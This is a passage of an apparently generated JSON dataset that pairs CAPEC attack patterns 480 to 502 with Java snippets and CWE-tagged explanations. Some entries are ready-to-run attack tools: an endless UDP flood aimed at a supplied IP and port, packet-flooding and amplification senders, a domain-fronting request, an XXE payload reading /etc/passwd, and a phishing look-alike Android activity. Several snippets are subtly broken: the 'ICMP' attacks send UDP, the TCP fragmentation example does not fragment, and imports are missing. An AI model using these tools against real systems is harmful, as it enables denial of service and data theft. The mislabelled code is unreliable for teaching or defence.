        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VirtualizationEscape {\n    public static void main(String[] args) {\n        try {\n            // Simulate a virtualized environment by running a command in a sandbox\n            Process process = Runtime.getRuntime().exec(\"sandboxed_command\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n\n            // Vulnerability: Improper isolation allows escape from the sandbox\n            // Execute a command on the host system\n            Process hostProcess = Runtime.getRuntime().exec(\"host_command\");\n            BufferedReader hostReader = new BufferedReader(new InputStreamReader(hostProcess.getInputStream()));\n            while ((line = hostReader.readLine()) != null) {\n                System.out.println(line);\n            }\n            hostReader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application running in a virtualized environment (sandbox) can escape and execute commands on the host system. The code first runs a command within a simulated sandbox environment. Due to improper isolation (CWE-653), the code then executes another command directly on the host system, representing a failure in the protection mechanism (CWE-693). This escape from the virtualized environment to the host system is the main idea of the CAPEC 'Escaping Virtualization'. The code also highlights the risk of executing commands in an untrusted environment (CWE-114)."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class DomainFrontingExample {\n    public static void main(String[] args) throws IOException {\n        String sniDomain = \"trusted.example.com\";\n        String hostHeaderDomain = \"malicious.example.com\";\n\n        URL url = new URL(\"https://\" + sniDomain);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestProperty(\"Host\", hostHeaderDomain);\n\n        // Send request and get response\n        int responseCode = connection.getResponseCode();\n        System.out.println(\"Response Code: \" + responseCode);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of Domain Fronting, where different domain names are used in the SNI field of the TLS header and the Host field of the HTTP header. The `sniDomain` is set to a trusted domain, while the `hostHeaderDomain` is set to a malicious domain. The `HttpURLConnection` object is used to establish a connection to the `sniDomain`, but the `Host` header is set to `hostHeaderDomain`. This can lead to traffic being routed to an inappropriate destination, embodying the main idea of the CAPEC. The code also touches on related CWEs such as improper restriction of communication channels (CWE-923) and incorrectly specified destinations (CWE-941)."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPFloodVulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                // No limit on the number of connections\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        // Handle client connection\n        // No throttling or resource limits\n        try {\n            clientSocket.getOutputStream().write(\"Welcome!\".getBytes());\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple TCP server that is vulnerable to a TCP flood attack. The server listens on port 8080 and accepts incoming connections without any limit or throttling, which corresponds to CWE-770 (Allocation of Resources Without Limits or Throttling). The server does not implement any mechanism to restrict the number of simultaneous connections, making it susceptible to being overwhelmed by a large number of TCP SYN messages, leading to a denial of service. This demonstrates the main idea of the CAPEC 'TCP Flood' attack, where an adversary can exploit the lack of resource management to deny legitimate users access to the service."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlInput = \"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\"> ]><foo>&xxe;</foo>\";\n        try {\n            // Parse XML without proper validation\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // CWE-611\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlInput)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void validateXML(String xmlInput) throws SAXException, IOException {\n        SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n        Schema schema = factory.newSchema(new StreamSource(\"schema.xsd\")); // CWE-112\n        Validator validator = schema.newValidator();\n        validator.validate(new StreamSource(new StringReader(xmlInput)));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that does not properly validate XML input against a schema (CWE-112) and does not restrict XML external entity references (CWE-611). The `main` method parses an XML string containing an external entity reference, which can lead to an XML External Entity (XXE) attack. The `validateXML` method is provided as a reference for how XML validation should be performed, but it is not used in the `main` method, highlighting the vulnerability. This code embodies the main idea of the deprecated CAPEC related to XML client-side attacks by showing how improper XML handling can lead to security issues."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair using a predictable random number generator\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        SecureRandom predictableRandom = new SecureRandom(new byte[]{0x00, 0x01, 0x02, 0x03}); // Predictable seed\n        keyGen.initialize(2048, predictableRandom);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n        PublicKey publicKey = keyPair.getPublic();\n\n        // Sign a message\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        String message = \"This is a secret message\";\n        signature.update(message.getBytes());\n        byte[] signedMessage = signature.sign();\n        String encodedSignature = Base64.getEncoder().encodeToString(signedMessage);\n        System.out.println(\"Signed message: \" + encodedSignature);\n\n        // Verify the signature\n        signature.initVerify(publicKey);\n        signature.update(message.getBytes());\n        boolean isVerified = signature.verify(Base64.getDecoder().decode(encodedSignature));\n        System.out.println(\"Signature verified: \" + isVerified);\n    }\n}",
        "description": "This Java code snippet demonstrates a cryptographic operation where a key pair is generated using a predictable random number generator. The use of a predictable seed in the SecureRandom instance (CWE-1241) makes the key pair generation insecure. An attacker could potentially recreate the same key pair by knowing the seed, leading to the possibility of signature spoofing (CAPEC-330). The code signs a message and then verifies the signature, but due to the predictable random number generation, the private key could be compromised, allowing an attacker to forge signatures and bypass authentication mechanisms (CWE-290). This example highlights the importance of using a secure and unpredictable source of randomness in cryptographic operations."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPFlood {\n    public static void main(String[] args) throws Exception {\n        if (args.length < 3) {\n            System.out.println(\"Usage: java UDPFlood <target_ip> <target_port> <message>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        int targetPort = Integer.parseInt(args[1]);\n        String message = args[2];\n\n        InetAddress targetAddress = InetAddress.getByName(targetIp);\n        byte[] buffer = message.getBytes();\n\n        DatagramSocket socket = new DatagramSocket();\n\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);\n            socket.send(packet);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP flood attack. The program sends a continuous stream of UDP packets to a specified target IP address and port. The message to be sent is provided as a command-line argument. This code embodies the main idea of the CAPEC 'UDP Flood' by continuously sending UDP packets to overwhelm the target's network resources. The code does not impose any restrictions on the number of packets sent (CWE-770), does not verify the integrity of the message (CWE-924), and can be used to send a large volume of network messages (CWE-406). The session-less nature of UDP makes it easy to spoof the source address, making it difficult to trace the attack back to its origin."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ICMPFlood {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java ICMPFlood <target IP> <packet count>\");\n            return;\n        }\n\n        String targetIP = args[0];\n        int packetCount = Integer.parseInt(args[1]);\n        byte[] buffer = new byte[1024];\n        InetAddress targetAddress = InetAddress.getByName(targetIP);\n\n        try (DatagramSocket socket = new DatagramSocket()) {\n            for (int i = 0; i < packetCount; i++) {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 7);\n                socket.send(packet);\n                System.out.println(\"Sent packet \" + (i + 1));\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple ICMP flood attack. The program sends a specified number of ICMP packets to a target IP address. The code does not impose any restrictions on the number of packets sent (CWE-770), making it possible to overwhelm the target's network bandwidth. The DatagramSocket is used to send packets without verifying the destination (CWE-941) or ensuring the communication is with the correct endpoint (CWE-923). This can lead to a denial of service for legitimate users. The code is a basic example and should not be used maliciously."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableEndpoint\")\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No throttling or resource limits\n        String param = request.getParameter(\"param\");\n        // Simulate resource-intensive operation\n        for (int i = 0; i < 1000000; i++) {\n            // Dummy operation to consume CPU\n            Math.sqrt(i);\n        }\n        response.getWriter().append(\"Processed request with param: \").append(param);\n    }\n}",
        "description": "This Java servlet code snippet represents a vulnerable endpoint that can be exploited by an HTTP Flood attack. The servlet processes HTTP GET requests without any throttling or resource limits (CWE-770). It performs a resource-intensive operation (a loop with a dummy CPU-consuming task) for each request, which can easily exhaust server resources (CWE-410). The parameter 'param' is included in the query string, which could potentially expose sensitive information (CWE-598). This code demonstrates how an attacker could send numerous legitimate HTTP GET requests to overwhelm the server, leading to a denial of service for legitimate users."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import javax.net.ssl.SSLServerSocketFactory;\nimport javax.net.ssl.SSLServerSocket;\nimport javax.net.ssl.SSLSocket;\nimport java.io.IOException;\n\npublic class SSLFloodVulnerableServer {\n    public static void main(String[] args) {\n        SSLServerSocketFactory factory = (SSLServerSocketFactory) SSLServerSocketFactory.getDefault();\n        try (SSLServerSocket serverSocket = (SSLServerSocket) factory.createServerSocket(8443)) {\n            while (true) {\n                SSLSocket clientSocket = (SSLSocket) serverSocket.accept();\n                // No throttling or resource limit checks\n                new Thread(() -> handleClient(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(SSLSocket clientSocket) {\n        try {\n            // Simulate SSL handshake and renegotiation\n            clientSocket.startHandshake();\n            while (true) {\n                clientSocket.startHandshake(); // Renegotiate endlessly\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable SSL server that is susceptible to an SSL Flood attack. The server listens for incoming SSL connections on port 8443. For each connection, it spawns a new thread to handle the client without any throttling or resource limit checks (CWE-770, CWE-410, CWE-400). The handleClient method simulates an SSL handshake and then continuously renegotiates the SSL connection (CWE-1125), consuming server resources excessively. This can lead to resource exhaustion, making the server unavailable to legitimate users. The code demonstrates how an attacker can exploit the lack of resource management to perform a denial-of-service attack."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class AmplificationAttackExample {\n    public static void main(String[] args) throws Exception {\n        String targetIp = \"192.168.1.100\"; // Target server IP\n        String message = \"Hello\"; // Small request message\n        int port = 12345; // Target server port\n\n        // Create a socket to send the request\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress targetAddress = InetAddress.getByName(targetIp);\n\n        // Create a packet with the small request message\n        DatagramPacket packet = new DatagramPacket(message.getBytes(), message.length(), targetAddress, port);\n\n        // Send the packet multiple times to simulate amplification\n        for (int i = 0; i < 1000; i++) {\n            socket.send(packet);\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an amplification attack. The code sends a small request message ('Hello') to a target server multiple times (1000 times in this case). The target server is specified by its IP address and port number. The DatagramSocket and DatagramPacket classes are used to send the UDP packets. This code embodies the main idea of the CAPEC by showing how an adversary can generate a large amount of traffic directed at a target server using relatively few resources. The related CWEs are represented by the lack of resource allocation limits (CWE-770), asymmetric resource consumption (CWE-405), insufficient control of network message volume (CWE-406), and the potential for early amplification before proper authentication (CWE-408)."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class QuadraticDataExpansion {\n    public static void main(String[] args) {\n        // Define a large entity\n        String largeEntity = \"A\".repeat(10000); // CWE-770: No limit on resource allocation\n        \n        // Create a map to store expanded data\n        Map<String, String> expandedData = new HashMap<>();\n        \n        // Perform multiple substitutions\n        for (int i = 0; i < 10000; i++) { // CWE-1325: Improperly controlled sequential memory allocation\n            expandedData.put(\"key\" + i, largeEntity); // CWE-1043: Aggregating large number of non-primitive elements\n        }\n        \n        // Simulate processing the expanded data\n        processExpandedData(expandedData);\n    }\n\n    private static void processExpandedData(Map<String, String> data) {\n        // Simulate some processing\n        for (String key : data.keySet()) {\n            System.out.println(\"Processing \" + key + \": \" + data.get(key).length() + \" characters\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Quadratic Data Expansion attack. It defines a large entity (a string of 10,000 'A' characters) and uses it multiple times in a loop to populate a HashMap with 10,000 entries. This can lead to excessive memory allocation, potentially causing a denial of service. The code embodies CWE-770 by not limiting the size of the allocated resource, CWE-1325 by improperly controlling sequential memory allocation, and CWE-1043 by aggregating a large number of non-primitive elements. The processExpandedData method simulates processing the expanded data, which can further exacerbate the memory consumption issue."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class RegexExponentialBlowup {\n    public static void main(String[] args) {\n        String regex = \"(a+)+\"; // Inefficient regex with exponential complexity\n        String input = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"; // Input designed to cause exponential blowup\n\n        Pattern pattern = Pattern.compile(regex);\n        Matcher matcher = pattern.matcher(input);\n\n        long startTime = System.currentTimeMillis();\n        boolean matchFound = matcher.matches();\n        long endTime = System.currentTimeMillis();\n\n        System.out.println(\"Match found: \" + matchFound);\n        System.out.println(\"Time taken: \" + (endTime - startTime) + \"ms\");\n    }\n}",
        "description": "This Java code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The regex pattern \"(a+)+\" is inefficient and has exponential worst-case complexity. The input string \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\" is crafted to exploit this inefficiency, causing the regex engine to consume excessive CPU cycles due to backtracking. This example highlights CWE-1333 (Inefficient Regular Expression Complexity) and CWE-400 (Uncontrolled Resource Consumption), as the regex can lead to significant resource exhaustion. The code measures the time taken to perform the match, illustrating the potential performance impact."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class SOAPArrayBlowupExample {\n    public static void main(String[] args) {\n        String largeSOAPArray = \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><ArrayOfStrings>\";\n        for (int i = 0; i < 1000000; i++) {\n            largeSOAPArray += \"<string>element\" + i + \"</string>\";\n        }\n        largeSOAPArray += \"</ArrayOfStrings></soap:Body></soap:Envelope>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(largeSOAPArray)));\n            System.out.println(\"Parsed SOAP message successfully.\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP Array Blowup attack. It constructs a SOAP message with a very large array declaration containing 1,000,000 elements. The code then attempts to parse this large SOAP message using the DocumentBuilderFactory and DocumentBuilder classes. The main idea is to show how an attacker can exhaust the memory resources of a web service by sending a SOAP message with a large array declaration. This example also touches on related CWEs such as 'Allocation of Resources Without Limits or Throttling' (CWE-770) and 'Improperly Controlled Sequential Memory Allocation' (CWE-1325) by not imposing any restrictions on the size of the array being parsed."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class TCPFragmentationAttack {\n    private static final int PORT = 8080;\n    private static final int MAX_THREADS = 100;\n    private static ExecutorService threadPool = Executors.newFixedThreadPool(MAX_THREADS);\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(PORT);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            threadPool.execute(() -> handleClient(clientSocket));\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            byte[] buffer = new byte[1024];\n            int bytesRead = clientSocket.getInputStream().read(buffer);\n            if (bytesRead > 0) {\n                // Simulate improper resource shutdown or release\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that listens for incoming TCP connections on port 8080. It uses a fixed thread pool to handle multiple client connections concurrently, which can lead to resource exhaustion if not properly managed (CWE-770). The server reads data from the client and then closes the connection, simulating improper resource shutdown or release (CWE-404). The code does not handle TCP fragmentation directly but sets up a scenario where an attacker could exploit TCP fragmentation to bypass network controls. The lack of proper resource management and shutdown can be leveraged by an attacker to execute a TCP Fragmentation attack, as described in the CAPEC."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class UDPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        int targetPort = 12345;\n        byte[] largeData = new byte[2000]; // Data larger than typical MTU\n        Arrays.fill(largeData, (byte) 0xAB); // Fill with dummy data\n\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(largeData, largeData.length, targetAddress, targetPort);\n\n        // Send the large packet repeatedly to simulate the attack\n        while (true) {\n            socket.send(packet);\n            System.out.println(\"Packet sent\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP fragmentation attack. The code creates a large UDP packet (2000 bytes) which exceeds the typical Ethernet MTU of 1500 bytes, forcing fragmentation. The packet is then sent repeatedly to a target server at IP address '192.168.1.1' on port 12345. This continuous sending of large fragmented packets can consume network bandwidth and server resources, potentially leading to a denial of service. The code does not implement any resource limits or throttling (CWE-770), does not properly release resources (CWE-404), and does not control the volume of network messages (CWE-406), making it a clear example of the vulnerabilities described in the CAPEC."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class ICMPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        byte[] icmpMessage = new byte[65535]; // Large ICMP message\n        Arrays.fill(icmpMessage, (byte) 0xFF); // Fill with dummy data\n\n        DatagramSocket socket = new DatagramSocket();\n        for (int i = 0; i < 1000; i++) { // Send a large number of packets\n            DatagramPacket packet = new DatagramPacket(icmpMessage, icmpMessage.length, targetAddress, 0);\n            socket.send(packet);\n        }\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates an ICMP Fragmentation attack. The code creates a large ICMP message and sends it repeatedly to a target IP address. The attack aims to consume resources on the target host, potentially causing it to become non-responsive. The code does not impose any limits on the number of packets sent (CWE-770) and does not properly release resources (CWE-404), which can exacerbate the attack's impact. The large ICMP message is filled with dummy data, and the DatagramSocket is used to send the packets to the target address."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FileDiscovery {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java FileDiscovery <directory>\");\n            return;\n        }\n\n        String directory = args[0];\n        File dir = new File(directory);\n\n        if (!dir.exists() || !dir.isDirectory()) {\n            System.out.println(\"Invalid directory\");\n            return;\n        }\n\n        File[] files = dir.listFiles();\n        if (files != null) {\n            for (File file : files) {\n                if (file.isFile()) {\n                    try {\n                        String content = new String(Files.readAllBytes(Paths.get(file.getPath())));\n                        System.out.println(\"Discovered file: \" + file.getName());\n                        System.out.println(\"Content: \" + content);\n                    } catch (IOException e) {\n                        System.out.println(\"Error reading file: \" + file.getName());\n                    }\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic file discovery mechanism. The program takes a directory path as an argument, checks if the directory exists, and then lists all files within that directory. For each file, it reads and prints the file's content. This embodies the CAPEC 'File Discovery' by probing a directory to find and read files, potentially exposing sensitive information (CWE-200). The code also highlights potential vulnerabilities such as CWE-529 (if the directory contains access control list files), CWE-73 (if the directory path is influenced by user input), CWE-426 (if the search path is untrusted), and CWE-646 (if the file type is misclassified based on its extension)."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import java.awt.image.BufferedImage;\nimport java.io.File;\nimport javax.imageio.ImageIO;\n\npublic class ScreenshotHandler {\n    public static void main(String[] args) {\n        try {\n            // Simulate taking a screenshot and saving it to a file\n            BufferedImage screenshot = new BufferedImage(200, 200, BufferedImage.TYPE_INT_ARGB);\n            File outputfile = new File(\"screenshot.png\");\n            ImageIO.write(screenshot, \"png\", outputfile);\n\n            // Simulate an adversary accessing the screenshot\n            BufferedImage accessedScreenshot = ImageIO.read(new File(\"screenshot.png\"));\n            // Process the screenshot to extract sensitive information (simulated)\n            String sensitiveInfo = extractSensitiveInfo(accessedScreenshot);\n            System.out.println(\"Extracted Sensitive Information: \" + sensitiveInfo);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String extractSensitiveInfo(BufferedImage image) {\n        // Simulate extraction of sensitive information from the screenshot\n        return \"Sensitive Data\";\n    }\n}",
        "description": "This Java code snippet simulates the process of taking a screenshot and saving it to a file, which represents the temporary screenshots created by iOS while an application is in the background. The code then simulates an adversary accessing this screenshot and extracting sensitive information from it. This embodies the main idea of the CAPEC 'Probe iOS Screenshots'. The code also touches on related CWEs by demonstrating how sensitive information can be exposed (CWE-359), and how unauthorized actors can access this information (CWE-497). The code is a simplified representation and does not include actual security measures, highlighting the vulnerability."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.SENSITIVE_ACTION\")) {\n            // CWE-927: Use of Implicit Intent for Sensitive Communication\n            String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}\n\n// CWE-926: Improper Export of Android Application Components\n// This component is exported without proper restrictions in the AndroidManifest.xml\n// <receiver android:name=\".VulnerableReceiver\" android:exported=\"true\" />",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly handles intents, embodying the main idea of the CAPEC 'Android Intent Intercept'. The BroadcastReceiver listens for an implicit intent with the action 'com.example.SENSITIVE_ACTION'. When such an intent is received, it extracts and logs sensitive data without verifying the source of the intent (CWE-925). The use of an implicit intent for transmitting sensitive data (CWE-927) and the improper export of the BroadcastReceiver component (CWE-926) further exacerbate the vulnerability. This setup allows a malicious application to intercept, modify, or block the intent, leading to potential information disclosure, denial of service, or data injection attacks."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.setWebViewClient(new WebViewClient());\n\n        // Adding a JavaScript interface that can be exploited\n        webView.addJavascriptInterface(new WebAppInterface(), \"Android\");\n\n        webView.loadUrl(\"http://example.com\");\n    }\n\n    public class WebAppInterface {\n        @JavascriptInterface\n        public void showToast(String toast) {\n            // Dangerous method exposed to JavaScript\n            Toast.makeText(MainActivity.this, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses a WebView component to load a web page. The WebView is configured to enable JavaScript and includes a JavaScript interface (`WebAppInterface`) that exposes a method (`showToast`) to the web page's JavaScript context. This method can be exploited by an attacker to inject malicious code into the web page, manipulate the DOM, and access sensitive information. The code embodies the main idea of the CAPEC 'WebView Injection' by showing how an exposed dangerous method (CWE-749) can be used for malicious purposes. Additionally, it highlights the lack of proper verification of the source of communication (CWE-940) and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.widget.EditText;\nimport android.widget.Button;\nimport android.view.View;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        Button button = findViewById(R.id.button);\n        button.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Using implicit intent to launch another activity\n                Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n                startActivity(intent);\n            }\n        });\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\nimport android.widget.EditText;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimicking the trusted activity's UI\n        EditText sensitiveInput = findViewById(R.id.sensitive_input);\n    }\n}",
        "description": "The provided code snippet demonstrates a scenario where an Android application uses an implicit intent to launch a trusted activity. The MainActivity class contains a button that, when clicked, sends an implicit intent to start an activity identified by the action 'com.example.TRUSTED_ACTIVITY'. This implicit intent can be intercepted by a malicious application that registers an activity with the same action. The MaliciousActivity class mimics the trusted activity's user interface, prompting the user to enter sensitive information, which can then be captured by the malicious application. This code embodies the main idea of the CAPEC 'Android Activity Hijack' and highlights the related CWEs, such as the use of implicit intents (CWE-927) and improper verification of the communication channel's source (CWE-940)."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.widget.Toast;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        // CWE-926: Improper Export of Android Application Components\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // CWE-284: Improper Access Control\n        \n        // No verification of the intent's source\n        String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n        \n        // Display the sensitive data (for demonstration purposes)\n        Toast.makeText(context, \"Received data: \" + sensitiveData, Toast.LENGTH_LONG).show();\n    }\n}",
